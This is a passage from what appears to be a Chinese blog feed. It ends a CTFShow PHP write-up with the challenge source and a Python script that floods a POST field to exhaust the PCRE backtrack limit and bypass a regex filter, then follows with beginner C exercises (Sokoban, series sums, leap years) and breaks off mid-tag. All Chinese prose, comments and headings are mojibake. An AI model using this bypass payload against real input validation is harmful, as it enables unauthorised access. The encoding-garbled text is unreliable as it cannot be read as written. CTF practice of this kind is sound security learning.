<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 05:19:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>å¯é‡‡ç”¨ä¸Šä¸€é¢˜è„šæœ¬:</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&#x27;http://f16472c2-b4b2-4983-8528-8630be8b0610.challenge.ctf.show:8080/&#x27;</span> </span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web131.png"></p>
]]></content>
      <categories>
        <category>CTFç¬”è®°</category>
      </categories>
  </entry>
  <entry>
    <title>OLD</title>
    <url>/2019/08/12/OLD/</url>
    <content><![CDATA[<h1 id="OLD"><a href="#OLD" class="headerlink" title="OLD"></a>OLD</h1><p>ä»¥å¾€æ—§çš„å†…å®¹:ä¸å€¼ä¸€æ</p>
<span id="more"></span>

<h2 id="æ¨ç®±å­å•å…³å¡"><a href="#æ¨ç®±å­å•å…³å¡" class="headerlink" title="æ¨ç®±å­å•å…³å¡"></a>æ¨ç®±å­å•å…³å¡</h2><p>åˆæ¬¡ä½¿ç”¨äºŒç»´æ•°ç»„å¹¶ç¼–å†™ç»å…¸å°æ¸¸æˆï¼šæ¨ç®±å­ï¼ï¼ˆå•å…³å¡ï¼‰</p>
<p>æ³¨ï¼šæŸ¥é˜…è¿‡ç™¾åº¦ï¼Œçƒ¦è¯·å–·å“¥ç•™å¾·ã€‚  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> H 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> L 8</span></span><br><span class="line"><span class="keyword">int</span> x,y; <span class="comment">// å…¨å±€å˜é‡å­˜å‚¨äººçš„åæ ‡ </span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[H][L]=</span><br><span class="line">&#123;</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">	&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>&#125;,</span><br><span class="line">	&#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">	&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125; 	<span class="comment">//0 ç©ºåœ°,1å¢™ï¼Œ2äººï¼Œ3ç®±å­ï¼Œ4ç›®çš„åœ°ï¼Œ7è¾¾åˆ°ç›®çš„åœ°  ä¸€ä¸ªéšè—çš„6ä¹Ÿæ˜¯è¡¨ç¤ºäººï¼Œåªä¸è¿‡è¿™äººç«™åœ¨ç›®çš„åœ°ä¸Šé¢ã€‚ </span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw_map</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x_y</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">		draw_map();</span><br><span class="line">		move();	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡ºå›¾å½¢ </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw_map</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;H;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;L;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">switch</span>(<span class="built_in">map</span>[i][j])	<span class="comment">// 0=ç©ºåœ°ï¼Œ1=å¢™ï¼Œ2=äººï¼Œ3=ç®±å­ï¼Œ4=ç›®çš„åœ°ï¼› </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">printf</span>(<span class="string">&quot;--&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">printf</span>(<span class="string">&quot;â– &quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">printf</span>(<span class="string">&quot;â™€&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">printf</span>(<span class="string">&quot;â—†&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">4</span>:<span class="built_in">printf</span>(<span class="string">&quot;Â¤&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">printf</span>(<span class="string">&quot;â™‚&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">7</span>:<span class="built_in">printf</span>(<span class="string">&quot;â˜…&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ç§»åŠ¨ </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	x_y();</span><br><span class="line">	boxs_num() ;</span><br><span class="line">	<span class="keyword">char</span> WASD;</span><br><span class="line">	WASD =_getch();</span><br><span class="line">	<span class="keyword">switch</span>(WASD)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// ä¸Š </span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:<span class="keyword">case</span> <span class="number">72</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">4</span>)	<span class="comment">// äººçš„å‰é¢ä½ç½®ä¸º ç©ºç™½ æˆ–è€… äººçš„å‰é¢å€¼ç›®çš„åœ° </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x<span class="number">-1</span>][y] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 ç©ºåœ°,1å¢™ï¼Œ2äººï¼Œ3ç®±å­ï¼Œ4ç›®çš„åœ°ï¼Œ7è¾¾åˆ°ç›®çš„åœ°  ä¸€ä¸ªéšè—çš„6ä¹Ÿæ˜¯è¡¨ç¤ºäººï¼Œåªä¸è¿‡è¿™äººç«™åœ¨ç›®çš„åœ°ä¸Šé¢ã€‚</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">3</span> || <span class="built_in">map</span>[x<span class="number">-1</span>][y] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x<span class="number">-2</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x<span class="number">-2</span>][y] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x<span class="number">-1</span>][y] -=<span class="number">1</span>; <span class="comment">// ç®±å­å˜äºº</span></span><br><span class="line">					<span class="built_in">map</span>[x<span class="number">-2</span>][y] +=<span class="number">3</span>; <span class="comment">// ç®±å­å‰é¢ çš„ç©ºåœ°å˜æˆ ç®±å­  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// ä¸‹</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:<span class="keyword">case</span> <span class="number">80</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">4</span>)	<span class="comment">// äººçš„å‰é¢ä½ç½®ä¸º ç©ºç™½ æˆ–è€… äººçš„å‰é¢å€¼ç›®çš„åœ° </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x+<span class="number">1</span>][y] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 ç©ºåœ°,1å¢™ï¼Œ2äººï¼Œ3ç®±å­ï¼Œ4ç›®çš„åœ°ï¼Œ7è¾¾åˆ°ç›®çš„åœ°  ä¸€ä¸ªéšè—çš„6ä¹Ÿæ˜¯è¡¨ç¤ºäººï¼Œåªä¸è¿‡è¿™äººç«™åœ¨ç›®çš„åœ°ä¸Šé¢ã€‚</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">3</span> || <span class="built_in">map</span>[x+<span class="number">1</span>][y] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x+<span class="number">2</span>][y] == <span class="number">0</span> || <span class="built_in">map</span>[x+<span class="number">2</span>][y] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x+<span class="number">1</span>][y] -=<span class="number">1</span>; <span class="comment">// ç®±å­å˜äºº</span></span><br><span class="line">					<span class="built_in">map</span>[x+<span class="number">2</span>][y] +=<span class="number">3</span>; <span class="comment">// ç®±å­å‰é¢ çš„ç©ºåœ°å˜æˆ ç®±å­  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">// å·¦</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:<span class="keyword">case</span> <span class="number">75</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">4</span>)	<span class="comment">// äººçš„å‰é¢ä½ç½®ä¸º ç©ºç™½ æˆ–è€… äººçš„å‰é¢å€¼ç›®çš„åœ° </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x][y<span class="number">-1</span>] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 ç©ºåœ°,1å¢™ï¼Œ2äººï¼Œ3ç®±å­ï¼Œ4ç›®çš„åœ°ï¼Œ7è¾¾åˆ°ç›®çš„åœ°  ä¸€ä¸ªéšè—çš„6ä¹Ÿæ˜¯è¡¨ç¤ºäººï¼Œåªä¸è¿‡è¿™äººç«™åœ¨ç›®çš„åœ°ä¸Šé¢ã€‚</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">3</span> || <span class="built_in">map</span>[x][y<span class="number">-1</span>] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x][y<span class="number">-2</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y<span class="number">-2</span>] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x][y<span class="number">-1</span>] -=<span class="number">1</span>; <span class="comment">// ç®±å­å˜äºº</span></span><br><span class="line">					<span class="built_in">map</span>[x][y<span class="number">-2</span>] +=<span class="number">3</span>; <span class="comment">// ç®±å­å‰é¢ çš„ç©ºåœ°å˜æˆ ç®±å­  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">// å³</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:<span class="keyword">case</span> <span class="number">77</span>:</span><br><span class="line">			<span class="keyword">if</span>( <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">4</span>)	<span class="comment">// äººçš„å‰é¢ä½ç½®ä¸º ç©ºç™½ æˆ–è€… äººçš„å‰é¢å€¼ç›®çš„åœ° </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">map</span>[x][y+<span class="number">1</span>] +=<span class="number">2</span>;</span><br><span class="line">			&#125;						<span class="comment">//0 ç©ºåœ°,1å¢™ï¼Œ2äººï¼Œ3ç®±å­ï¼Œ4ç›®çš„åœ°ï¼Œ7è¾¾åˆ°ç›®çš„åœ°  ä¸€ä¸ªéšè—çš„6ä¹Ÿæ˜¯è¡¨ç¤ºäººï¼Œåªä¸è¿‡è¿™äººç«™åœ¨ç›®çš„åœ°ä¸Šé¢ã€‚</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>( <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">3</span> || <span class="built_in">map</span>[x][y+<span class="number">1</span>] == <span class="number">7</span>) </span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[x][y+<span class="number">2</span>] == <span class="number">0</span> || <span class="built_in">map</span>[x][y+<span class="number">2</span>] == <span class="number">4</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">map</span>[x][y] -=<span class="number">2</span>;</span><br><span class="line">					<span class="built_in">map</span>[x][y+<span class="number">1</span>] -=<span class="number">1</span>; <span class="comment">// ç®±å­å˜äºº</span></span><br><span class="line">					<span class="built_in">map</span>[x][y+<span class="number">2</span>] +=<span class="number">3</span>; <span class="comment">// ç®±å­å‰é¢ çš„ç©ºåœ°å˜æˆ ç®±å­  </span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">		 </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–äººçš„åæ ‡</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x_y</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;H;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;L;j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[i][j] == <span class="number">2</span>||<span class="built_in">map</span>[i][j] == <span class="number">6</span>)</span><br><span class="line">					&#123;x=i;y=j;&#125;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;äººçš„åæ ‡(%d,%d)\n&quot;</span>,x,y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è‡ªåŠ¨æ±‚å¾—ç®±å­ä¸ªæ•°</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">boxs_num</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,boxs=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;H;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;L;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">map</span>[i][j] == <span class="number">3</span>)</span><br><span class="line">				boxs++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>( boxs == <span class="number">0</span> )</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;æ¸¸æˆç»“æŸ!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/tuixiangzi.gif"></p>
<h2 id="1Â²-2Â²-3Â²-â€¦â€¦10Â²"><a href="#1Â²-2Â²-3Â²-â€¦â€¦10Â²" class="headerlink" title="1Â²+2Â²+3Â²+â€¦â€¦10Â²"></a>1Â²+2Â²+3Â²+â€¦â€¦10Â²</h2><p>è®¡ç®—1Â²+2Â²+3Â²+â€¦â€¦10Â²ï¼š  </p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,sum=<span class="number">0</span>,temp;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			temp=i*i;</span><br><span class="line">			sum+=temp;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;sum=%d\n&quot;</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/011.jpg"></p>
<h2 id="1-2-2-3-3-4-4-5-5"><a href="#1-2-2-3-3-4-4-5-5" class="headerlink" title="1+2^2+3^3+4^4+5^5"></a>1+2^2+3^3+4^4+5^5</h2><p>è®¡ç®—ï¼š1+2^2+3^3+4^4+5^5ï¼š  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,temp,sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			temp=<span class="number">1</span>;</span><br><span class="line">			<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">				temp*=i;</span><br><span class="line">			sum+=temp;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1+2^2+3^3+4^4+5^5=&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d\n&quot;</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/123.jpg"></p>
<h2 id="1-3-3-9-2-7-1-4-4-1-6"><a href="#1-3-3-9-2-7-1-4-4-1-6" class="headerlink" title="1 3 3 9 2 7 1 4 4 1 6"></a>1 3 3 9 2 7 1 4 4 1 6</h2><p>è¾“å‡ºæ•°åˆ—ï¼š 1 3 3 9 2 7 1 4 4 1 6â€¦â€¦ å‰20é¡¹ã€‚  </p>
<p>æºä»£ç ï¼š </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 20</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t=<span class="number">0</span>;</span><br><span class="line">	a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">	a[<span class="number">1</span>]=<span class="number">3</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			a[i]=a[i<span class="number">-1</span>]*a[i<span class="number">-2</span>];</span><br><span class="line">			t=a[i];</span><br><span class="line">			<span class="keyword">if</span>(t&gt;=<span class="number">10</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					j=t;</span><br><span class="line">					a[i]=t/=<span class="number">10</span>;</span><br><span class="line">					a[++i]=j%=<span class="number">10</span>; </span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/133927.jpg"></p>
<h2 id="æ±‚2-22-222â€¦â€¦å‰7é¡¹å’Œ"><a href="#æ±‚2-22-222â€¦â€¦å‰7é¡¹å’Œ" class="headerlink" title="æ±‚2+22+222â€¦â€¦å‰7é¡¹å’Œ"></a>æ±‚2+22+222â€¦â€¦å‰7é¡¹å’Œ</h2><p>è®¡ç®— 2+22+222+2222+22222+222222+2222222 </p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 7</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,i,temp=<span class="number">10</span>,sum=<span class="number">0</span>;</span><br><span class="line">	a=b=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d+&quot;</span>,a)	;</span><br><span class="line">			sum+=a;</span><br><span class="line">			a=b*temp+a;</span><br><span class="line">			temp*=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\b=%d\n&quot;</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/2+22+222.jpg"></p>
<h2 id="21ä¸–çºªçš„é—°å¹´å’Œå¹³å¹´"><a href="#21ä¸–çºªçš„é—°å¹´å’Œå¹³å¹´" class="headerlink" title="21ä¸–çºªçš„é—°å¹´å’Œå¹³å¹´"></a>21ä¸–çºªçš„é—°å¹´å’Œå¹³å¹´</h2><p>æºä»£ç ï¼š </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LeapYear_PeaceYear</span><span class="params">(<span class="keyword">int</span> year)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>((year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>)||year%<span class="number">400</span>==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> year,j=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;21ä¸–çºªçš„é—°å¹´å’Œå¹³å¹´ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;é—°å¹´ï¼š\n&quot;</span>);</span><br><span class="line">	<span 